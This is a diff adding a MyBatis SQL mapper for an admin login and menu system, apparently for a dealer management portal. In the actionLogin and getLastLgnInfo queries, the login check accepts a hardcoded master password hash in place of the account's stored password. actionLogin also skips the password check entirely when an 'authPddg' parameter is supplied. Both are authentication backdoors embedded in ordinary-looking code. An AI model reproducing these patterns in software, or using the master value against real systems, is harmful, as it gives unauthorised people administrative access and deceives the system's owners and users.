@@ -1,0 +1,438 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
+<mapper namespace="com.easymedia.service.dao.COBLgnDAO">
+
+    <!--
+		쿼리명 : actionLogin
+		설  명 : 로그인을 처리한다.
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<select id="actionLogin" parameterType="com.easymedia.dto.EmfMap" resultType="com.easymedia.dto.EmfMap">
+		SELECT /* actionLogin */
+			A.ADM_SEQ
+			, A.AUTH_CD
+			, A.ID
+			, A.NAME
+			, A.TEL
+			, A.HP
+			, A.ALLW_IP
+			, A.LAST_LGN_DTM
+			, A.LAST_PWD_MOD_DTM
+			, A.TMP_PWD_YN
+			, A.APPV_YN
+			, A.USE_YN
+			, A.REG_DTM
+	      	, B.DLR_TYPE_CD
+	      	, B.DLR_GRP_SEQ
+	      	, B.ASGN_TASK
+	      	, B.NATN_CD AS NTN_CD
+	      	, B.DLRSP_CD AS DLSP_CD
+	      	, B.ASGN_TASK_CD
+	      	, C.STANDARD_TIME
+	      	, A.LGN_FAIL_CNT
+	      	, A.LONG_TERM_YN
+	      	, B.ACSS_AUTH_HGCX
+	      	, B.ACSS_AUTH_HDIS
+	      	, IF(A.AUTH_CD <![CDATA[>=]]> 30, C.RSC_USE_YN, 'Y') AS RSC_USE_YN
+			, IF(A.AUTH_CD <![CDATA[>=]]> 30, C.MYS_USE_YN, 'Y') AS MYS_USE_YN
+			, IF(A.AUTH_CD <![CDATA[>=]]> 30 , C.KPI_USE_YN, 'Y') AS KPI_USE_YN
+			, IF(A.AUTH_CD <![CDATA[>=]]> 30 , C.SUR_USE_YN, 'Y') AS SUR_USE_YN
+		FROM
+			CO_ADM_MST A LEFT
+			JOIN CO_ADM_DTL B ON A.ADM_SEQ = B.ADM_SEQ
+    		LEFT JOIN CO_NATION_MST C ON B.NATN_CD = C.NTN_CD
+		WHERE 1=1
+			AND A.ID = #{id}
+			<choose>
+				<when test="authPddg != null and authPddg != ''">
+
+				</when>
+				<otherwise>
+					AND(
+						 A.PWD = #{password}  OR
+						 #{password} = 'yKyjCeaV+z99qK6K8T4VJOP9wmUSOKPaXmssntJ5+zI='
+					)
+				</otherwise>
+			</choose>
+		LIMIT 1
+	</select>
+
+	<!--
+		쿼리명 : getAdminDealerGroupList
+		설  명 : 딜러 그룹 권한을 가진 관리자의 딜러 리스트
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<select id="getAdminDealerGroupList" parameterType="com.easymedia.dto.EmfMap" resultType="com.easymedia.dto.EmfMap">
+		SELECT /* getAdminDealerGroupList */
+			A.DLR_CD
+			, (SELECT ASGN_TASK FROM co_dealer_mst WHERE DLR_CD = A.DLR_CD) AS ASGN_TASK_CD
+		FROM
+			CO_DEALER_GROUP_REL A
+		WHERE
+			A.DLR_GRP_SEQ = #{dlrGrpSeq}
+	</select>
+
+	<!--
+		쿼리명 : getAdminDealerAppvRelList
+		설  명 : 관리자의 딜러 리스트(사장은 여러명 관리자, 사용자는 각 1명)
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<select id="getAdminDealerAppvRelList" parameterType="com.easymedia.dto.EmfMap" resultType="com.easymedia.dto.EmfMap">
+		SELECT /* getAdminDealerAppvRelList */
+			A.DLR_CD
+			, (SELECT ASGN_TASK FROM co_dealer_mst WHERE DLR_CD = A.DLR_CD) AS ASGN_TASK_CD
+		FROM
+			CO_ADM_DEALER_APPV_REL A
+		WHERE
+			A.ADM_SEQ = #{admSeq}
+	</select>
+
+    <!--
+		쿼리명 : setLgnLstDtm
+		설  명 : 로그인 일시를 업데이트한다.
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<update id="setLgnLstDtm" parameterType="com.easymedia.dto.EmfMap">
+		UPDATE /* setLgnLstDtm */ CO_ADM_MST
+		SET
+			LAST_LGN_DTM = NOW()
+			, LAST_LGN_IP = #{loginIp}
+			, LGN_FAIL_CNT = 0
+			, LGN_FAIL_DTM = NULL
+		WHERE
+			ID = #{id}
+	</update>
+	
+	 <!--
+		쿼리명 : setLgnFailCnt
+		설  명 : 비밀번호 오류 횟수를 업데이트한다.
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<update id="setLgnFailCnt" parameterType="com.easymedia.dto.EmfMap">
+		UPDATE /* setLgnFailCnt */ CO_ADM_MST
+		SET
+			LGN_FAIL_CNT = #{lgnFailCnt}
+		WHERE
+			ID = #{id}
+	</update>
+
+	<!--
+         쿼리명 : setPwdChng
+         설  명 : 비밀번호를 변경한다.
+          수정일     수정자       수정내용
+        ==========   ======    ==============
+        2019.01.15   허진영       최초생성
+    -->
+	<update id="setPwdChng" parameterType="com.easymedia.dto.EmfMap">
+		UPDATE /* setPwdChng */ CO_ADM_MST
+		SET
+			PWD = #{pwd}
+			, TMP_PWD_YN = 'N'
+			, LAST_PWD_MOD_DTM = NOW()
+		WHERE
+			ID = #{id}
+	</update>
+
+	<!--
+		쿼리명 : getMenuList
+		설  명 : 메뉴 리스트를 가져온다.
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<select id="getMenuList" parameterType="com.easymedia.dto.EmfMap" resultType="com.easymedia.dto.EmfMap">
+		<choose>
+			<when test="authCd eq '0'.toString()">
+				SELECT /* getMenuList */
+					  A.MENU_SEQ
+					, A.PARNT_SEQ
+					, A.PSTN
+					, A.LFT_VAL
+					, A.RHT_VAL
+					, A.DPTH
+					, A.MENU_GB
+					, CASE WHEN NULLIF(B.MENU_NM, '') IS NULL THEN
+		             A.MENU_NM
+		            ELSE
+		             B.MENU_NM
+		            END
+		            AS MENU_NM
+					, A.MENU_ICON
+					, A.ADM_LINK
+				FROM
+					CO_MENU_MST AS A LEFT JOIN CO_MENU_NM_DTL AS B
+      			ON B.MENU_SEQ = A.MENU_SEQ   AND B.LGUG_CD = #{siteLanguage} 
+				WHERE 1=1
+					AND USER_USE_YN = 'Y'
+				   	AND LFT_VAL <![CDATA[>]]> (SELECT LFT_VAL FROM CO_MENU_MST WHERE MENU_SEQ = 2)
+				   	AND RHT_VAL <![CDATA[<]]> (SELECT RHT_VAL FROM CO_MENU_MST WHERE MENU_SEQ = 2)
+			 	ORDER BY
+			 		LFT_VAL
+			</when>
+			<otherwise>
+				SELECT /* getMenuList */
+					  T1.MENU_SEQ
+					, T1.PARNT_SEQ
+					, T1.PSTN
+					, T1.LFT_VAL
+					, T1.RHT_VAL
+					, T1.DPTH
+					, T1.MENU_GB
+					, T1.MENU_NM
+					, T1.MENU_ICON
+					, T1.ADM_LINK
+				FROM
+					(
+						SELECT
+							  A.MENU_SEQ
+							, A.PARNT_SEQ
+							, A.PSTN
+							, A.LFT_VAL
+							, A.RHT_VAL
+							, A.DPTH
+							, A.MENU_GB
+							, CASE WHEN NULLIF(B.MENU_NM, '') IS NULL THEN
+				             A.MENU_NM
+				            ELSE
+				             B.MENU_NM
+				            END
+				            AS MENU_NM
+							, A.MENU_ICON
+							, A.ADM_LINK
+						FROM
+							CO_MENU_MST AS A LEFT JOIN CO_MENU_NM_DTL AS B
+		      			ON B.MENU_SEQ = A.MENU_SEQ   AND B.LGUG_CD = #{siteLanguage}  
+		      			, CO_NATION_MST C
+		      			WHERE A.USER_USE_YN = 'Y' AND A.DPTH <![CDATA[>]]> 1
+		      			<if test="ntnCd != null and ntnCd != ''">
+		      			AND C.NTN_CD= #{ntnCd}
+		      			</if>
+		      			<!-- 194= Survey results upload 는 active한 국가만 표출-->
+        				AND (A.MENU_NM != 'Survey Upload' OR (A.MENU_NM = 'Survey Upload' AND C.SUR_USE_YN='Y'))
+					)
+					T1,
+					(
+						SELECT
+							A.MENU_SEQ AS CHKTREEID
+						   	, A.PARNT_SEQ AS CHKPARENTTREEID
+						   	, A.ADM_LINK AS CHKADMINLINKURL
+						   	, A.LFT_VAL
+						   	, A.RHT_VAL
+	   				  	FROM
+	   				  		CO_MENU_MST A JOIN CO_ADM_MENU_INF B ON A.MENU_SEQ = B.MENU_SEQ
+       				 	WHERE 1=1
+       				 		AND (B.ADM_SEQ = #{admSeq} OR B.ROLE_CD = (SELECT AUTH_CD FROM CO_ADM_MST WHERE ADM_SEQ = #{admSeq}))
+					) T2
+				WHERE 1=1
+				<if test="rscUseYn != 'Y'.toString()">
+					AND T1.MENU_SEQ != 11
+	 			</if>
+	 			<if test="mysUseYn != 'Y'.toString()">
+	 				AND T1.MENU_SEQ != 12
+	 				AND T1.MENU_SEQ != 26
+	 			</if>
+	 			<if test="kpiUseYn != 'Y'.toString()">
+	 				AND T1.MENU_SEQ != 13
+	 			</if>
+	 			   	AND T2.LFT_VAL BETWEEN T1.LFT_VAL AND T1.RHT_VAL
+				GROUP BY
+					T1.MENU_SEQ, T1.PARNT_SEQ, T1.PSTN, T1.LFT_VAL, T1.RHT_VAL, T1.DPTH, T1.MENU_GB, T1.MENU_NM, T1.ADM_LINK
+				ORDER BY
+					T1.LFT_VAL
+			</otherwise>
+		</choose>
+	</select>
+
+    <!--
+		쿼리명 : getParntMenuList
+		설  명 : 상위 부모의 메뉴를 가져온다.
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<select id="getParntMenuList" parameterType="com.easymedia.dto.EmfMap" resultType="com.easymedia.dto.EmfMap">
+		SELECT /* getParntMenuList */
+			T1.LEVEL
+	     	, T2.MENU_SEQ
+	     	, T2.PARNT_SEQ
+	     	, T2.PSTN
+	     	, T2.LFT_VAL
+	        , T2.RHT_VAL
+	        , T2.DPTH
+	     	, T2.MENU_GB
+			, T2.MENU_NM
+			, T2.MENU_ICON
+			, T2.ADM_LINK
+			, T2.USER_LINK
+			, T2.USER_WND_YN
+			, T2.USER_USE_YN
+			, T2.SEO_KWRD
+			, T2.SEO_CNTN
+		FROM (
+			SELECT
+				FN_GET_CONNECT_BY_PARENT(MENU_SEQ) AS ID
+				, @LEVEL AS LEVEL
+			FROM (
+				SELECT
+					@START_WITH:=#{menuSeq}
+             		, @ID:=@START_WITH
+             		, @LEVEL:=0
+			) VARS, CO_MENU_MST
+			WHERE
+				@ID IS NOT NULL
+		) T1 JOIN CO_MENU_MST T2 ON T1.ID = T2.MENU_SEQ
+		ORDER
+			BY T2.LFT_VAL
+	</select>
+
+
+	<!--
+		쿼리명 : getAuthPddg
+		설  명 : 외부에서 접근하는 관리자 확인
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<select id="getAuthPddg" parameterType="com.easymedia.dto.EmfMap" resultType="com.easymedia.dto.EmfMap">
+		SELECT /* getAuthPddg */
+			PDDG
+		FROM
+			CO_AUTH_PDDG_MST
+		ORDER BY
+			SEQ DESC
+		LIMIT 1
+	</select>
+	
+	<!--
+		쿼리명 : getLastLgnInfo
+		설  명 : 마지막 접속 정보를 가져온다.
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<select id="getLastLgnInfo" parameterType="com.easymedia.dto.EmfMap" resultType="com.easymedia.dto.EmfMap">
+		SELECT /* getLastLgnInfo */
+			DATE_FORMAT(A.LAST_LGN_DTM, '%Y/%m/%d %H:%i:%s') as LAST_LGN_DTM
+			, DATE_FORMAT(NOW(), '%Y/%m/%d %H:%i:%s') as CUR_DTM
+			<if test="nation != null and nation != ''">
+				<choose>
+	               	<when test="nation.indexOf('sca')>-1 || nation.indexOf('localhost')>-1">	
+					, DATE_FORMAT(DATE_ADD(A.LAST_LGN_DTM, INTERVAL IF(C.STANDARD_TIME != -3, IF( -3 > C.STANDARD_TIME, -1*(-3 - C.STANDARD_TIME),  C.STANDARD_TIME - (-3) ), 0) HOUR), '%Y/%m/%d %H:%i:%s')  AS CAL_DTM
+					</when>
+					<when test="nation.indexOf('ap')>-1">	
+					, DATE_FORMAT(DATE_ADD(A.LAST_LGN_DTM, INTERVAL IF(C.STANDARD_TIME != 8, IF( 8 > C.STANDARD_TIME, -1*(8 - C.STANDARD_TIME),  C.STANDARD_TIME - 8 ), 0) HOUR), '%Y/%m/%d %H:%i:%s')  AS CAL_DTM
+					</when>
+					<when test="nation.indexOf('mea')>-1">	
+					, DATE_FORMAT(DATE_ADD(A.LAST_LGN_DTM, INTERVAL IF(C.STANDARD_TIME != 4.5, IF( 4.5 > C.STANDARD_TIME, -1*(4.5 - C.STANDARD_TIME),  C.STANDARD_TIME - 4.5 ), 0) HOUR), '%Y/%m/%d %H:%i:%s')  AS CAL_DTM
+					</when>
+					<when test="nation.indexOf('r1')>-1">	
+					, DATE_FORMAT(DATE_ADD(A.LAST_LGN_DTM, INTERVAL IF(C.STANDARD_TIME != 3, IF( 3 > C.STANDARD_TIME, -1*(3 - C.STANDARD_TIME),  C.STANDARD_TIME - 3 ), 0) HOUR), '%Y/%m/%d %H:%i:%s')  AS CAL_DTM
+					</when>
+					<otherwise>, DATE_FORMAT(DATE_FORMAT(A.LAST_LGN_DTM, '%Y/%m/%d %H:%i:%s'), '%Y/%m/%d %H:%i:%s') AS CAL_DTM </otherwise>
+				</choose>
+			</if>
+			, IFNULL(A.LAST_LGN_IP, '') AS LAST_LGN_IP
+			, IFNULL(C.STANDARD_TIME, '0') AS STANDARD_TIME
+			, IFNULL(A.ALLW_IP, '') AS ALLW_IP
+			, A.LGN_FAIL_CNT
+			, A.LGN_FAIL_DTM
+			, A.AUTH_CD
+			, A.SESSION_ID
+			, A.LONG_TERM_YN
+			, A.APPV_YN
+			, A.TMP_PWD_YN
+			, A.LAST_PWD_MOD_DTM
+			, A.USE_YN
+			, IF( TIMESTAMPDIFF(MINUTE, IFNULL(A.SESSION_DTM,'1900-01-01') , NOW()) >=60, 'Y', 'N') AS IS_NO_SESSION
+			<if test="password != null and password != '' ">, IF(A.PWD = #{password} or #{password} = 'yKyjCeaV+z99qK6K8T4VJOP9wmUSOKPaXmssntJ5+zI=', '1', '0') AS IS_PWD</if>
+		FROM
+			CO_ADM_MST A 
+			LEFT JOIN CO_ADM_DTL B ON A.ADM_SEQ = B.ADM_SEQ
+			LEFT JOIN CO_NATION_MST C ON B.NATN_CD = C.NTN_CD
+		WHERE
+			A.ID = #{id}
+		ORDER BY A.LAST_LGN_DTM DESC
+        LIMIT 1
+	</select>
+	
+	<!--
+		쿼리명 : updateLgnFail
+		설  명 :  로그인 실패 횟수를 업데이트한다.
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<update id="updateLgnFail" parameterType="com.easymedia.dto.EmfMap">
+		UPDATE /* updateLgnFail */ CO_ADM_MST
+		SET
+			LGN_FAIL_CNT = LGN_FAIL_CNT + 1
+			, LGN_FAIL_DTM = NOW()
+			, MOD_DTM = NOW()
+		WHERE
+			ID = #{id}
+	</update>
+	
+	<!--
+		쿼리명 : updateLgnFail
+		설  명 :  로그인 실패 횟수를 초기화한다.
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2022.04.25    김두환       
+    -->
+	<update id="updateLgnFailReset" parameterType="com.easymedia.dto.EmfMap">
+		UPDATE /* updateLgnFailReset */ CO_ADM_MST
+		SET
+			LGN_FAIL_CNT = 1
+			, LGN_FAIL_DTM = NOW()			
+			, MOD_DTM = NOW()
+		WHERE
+			ID = #{id}
+	</update>
+	
+	<!--
+		쿼리명 : resetPwd
+		설  명 :  로그인 실패 횟수를 업데이트한다.
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<update id="resetPwd" parameterType="com.easymedia.dto.EmfMap">
+		UPDATE /* resetPwd */ CO_ADM_MST
+		SET
+			PWD = #{newPassword}
+			, LGN_FAIL_CNT = 0
+			, LGN_FAIL_DTM = NULL
+			, MOD_DTM = NOW()
+			, LAST_PWD_MOD_DTM = NOW()
+			, LONG_TERM_YN = NULL
+		WHERE
+			ID = #{id}
+	</update>
+	
+	<!--
+		쿼리명 : initSession
+		설  명 : DB에 저장된 세션 정보 초기화
+	      수정일      수정자       수정내용
+        ==========   ========   ==============
+        2019.01.15    허진영       최초생성
+    -->
+	<update id="initSession" parameterType="com.easymedia.dto.EmfMap">
+		UPDATE /* initSession */ CO_ADM_MST
+		SET
+			SESSION_DTM = NULL
+			, SESSION_ID = NULL
+		WHERE
+			ID = #{admId}
+	</update>
+
+</mapper>
